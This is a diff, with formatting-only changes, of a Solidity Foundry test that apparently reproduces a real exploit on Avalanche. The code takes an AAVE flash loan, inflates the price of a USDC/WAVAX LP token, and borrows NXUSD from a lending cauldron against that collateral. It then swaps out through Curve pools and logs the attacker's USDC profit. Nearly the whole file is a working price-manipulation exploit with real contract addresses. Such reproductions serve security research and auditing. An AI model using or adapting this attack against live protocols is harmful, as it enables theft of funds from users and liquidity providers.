@@ -19,11 +19,7 @@ abstract contract IDegenBox {
         bytes32 s
     ) public virtual;
 
-    function masterContractApproved(address masterContract, address user)
-        external
-        view
-        virtual
-        returns (bool);
+    function masterContractApproved(address masterContract, address user) external view virtual returns (bool);
 }
 
 interface ICauldronV2 {
@@ -36,7 +32,7 @@ interface ICauldronV2 {
     ) external payable returns (uint256, uint256);
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     ILendingPool aaveLendingPool = ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
     Uni_Router_V2 Router = Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
@@ -48,45 +44,31 @@ contract ContractTest is DSTest{
     IERC20 NXUSD = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
     IDegenBox DegenBox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
     ICauldronV2 CauldronV2 = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
-    address metaPool = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D; 
+    address metaPool = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D;
     address masterContract = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
     // flashLoan
     address[] public _assets = [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E]; //usdc
-    uint256[] public _amounts = [51000000000000];
+    uint256[] public _amounts = [51_000_000_000_000];
     uint256[] public _modes = [0];
-    // borrow 
-    uint8[] public actions = [5, 21, 20, 10]; 
+    // borrow
+    uint8[] public actions = [5, 21, 20, 10];
     uint256[] public values = [0, 0, 0, 0];
-    uint borrowAmounts = 998_000 * 1e18;
-    uint share = 0;
+    uint256 borrowAmounts = 998_000 * 1e18;
+    uint256 share = 0;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("Avalanche", 19613451); 
+        cheats.createSelectFork("Avalanche", 19_613_451);
     }
 
-    function testExploit() public{
-
-        USDC.approve(address(Router), type(uint).max);
-        WAVAX.approve(address(Router), type(uint).max);
+    function testExploit() public {
+        USDC.approve(address(Router), type(uint256).max);
+        WAVAX.approve(address(Router), type(uint256).max);
         // AAVE flashloan
-        aaveLendingPool.flashLoan(
-            address(this),
-            _assets,
-            _amounts,
-            _modes,
-            address(this),
-            new bytes(1),
-            0
-        );
+        aaveLendingPool.flashLoan(address(this), _assets, _amounts, _modes, address(this), new bytes(1), 0);
 
-        emit log_named_uint(
-            "After exploit repaid, profit in USDC of attacker:",
-            USDC.balanceOf(address(this)) / 1e6
-        );
-
-        
+        emit log_named_uint("After exploit repaid, profit in USDC of attacker:", USDC.balanceOf(address(this)) / 1e6);
     }
 
     function executeOperation(
@@ -104,70 +86,45 @@ contract ContractTest is DSTest{
         // get LP token
         buyWAVAXAndAddLP();
         // change LP price
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(USDC);
         path[1] = address(WAVAX);
-        Router.swapExactTokensForTokens(
-            USDC.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        Router.swapExactTokensForTokens(USDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
 
         /*
          * borrow NXUSD
         */
         // set contract apporval
-        NXUSD.approve(address(CRVPool1), type(uint).max);
-        Pair.approve(address(DegenBox), type(uint).max);
-        DegenBox.setMasterContractApproval(
-            address(this),
-            masterContract,
-            true,
-            0,
-            0,
-            0
-        );
+        NXUSD.approve(address(CRVPool1), type(uint256).max);
+        Pair.approve(address(DegenBox), type(uint256).max);
+        DegenBox.setMasterContractApproval(address(this), masterContract, true, 0, 0, 0);
         // update rate
         CauldronV2.updateExchangeRate();
         // cook function in CauldronV2
         bytes[] memory datas = new bytes[](4);
         datas[0] = abi.encode(borrowAmounts, address(this)); // type borrow
-        datas[1] = abi.encode(NXUSD, address(this), borrowAmounts,share); // type withdraw
-        datas[2] = abi.encode(Pair, address(this), 45330977931305070, share); // type deposit
+        datas[1] = abi.encode(NXUSD, address(this), borrowAmounts, share); // type withdraw
+        datas[2] = abi.encode(Pair, address(this), 45_330_977_931_305_070, share); // type deposit
         datas[3] = abi.encode(-2, address(this), false); // Collateral enter market
         CauldronV2.cook(actions, values, datas);
 
         // sell WAVAX`
         sellWAVAX();
         // NXUSD -> avCRV -> USDC_e
-        CRVPool1.exchange_underlying(
-            metaPool,
-            0,
-            2,
-            998_000 * 1e18,
-            950_000 * 1e6
-        );
+        CRVPool1.exchange_underlying(metaPool, 0, 2, 998_000 * 1e18, 950_000 * 1e6);
         // USDC_e -> USDC
-        USDC_e.approve(address(CRVPool2), type(uint).max);
+        USDC_e.approve(address(CRVPool2), type(uint256).max);
         CRVPool2.exchange(0, 1, 800_000 * 1e6, 700_000 * 1e6);
         sellUSDC_e();
-        USDC.approve(address(aaveLendingPool), type(uint).max);
+        USDC.approve(address(aaveLendingPool), type(uint256).max);
         return true;
     }
 
-    function buyWAVAXAndAddLP() public{
-        address [] memory path = new address[](2);
+    function buyWAVAXAndAddLP() public {
+        address[] memory path = new address[](2);
         path[0] = address(USDC);
         path[1] = address(WAVAX);
-        Router.swapExactTokensForTokens(
-            280_000 * 1e6,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        Router.swapExactTokensForTokens(280_000 * 1e6, 0, path, address(this), block.timestamp);
         Router.addLiquidity(
             address(USDC),
             address(WAVAX),
@@ -180,31 +137,18 @@ contract ContractTest is DSTest{
         );
     }
 
-    function sellWAVAX() public{
-        address [] memory path = new address[](2);
+    function sellWAVAX() public {
+        address[] memory path = new address[](2);
         path[0] = address(WAVAX);
         path[1] = address(USDC);
-        Router.swapExactTokensForTokens(
-            WAVAX.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 60
-        );
+        Router.swapExactTokensForTokens(WAVAX.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);
     }
 
-    function sellUSDC_e() public{
-        address [] memory path = new address[](2);
-        USDC_e.approve(address(Router), type(uint).max);
+    function sellUSDC_e() public {
+        address[] memory path = new address[](2);
+        USDC_e.approve(address(Router), type(uint256).max);
         path[0] = address(USDC_e);
         path[1] = address(USDC);
-        Router.swapExactTokensForTokens(
-            USDC_e.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 60
-        );
+        Router.swapExactTokensForTokens(USDC_e.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);
     }
-
 }
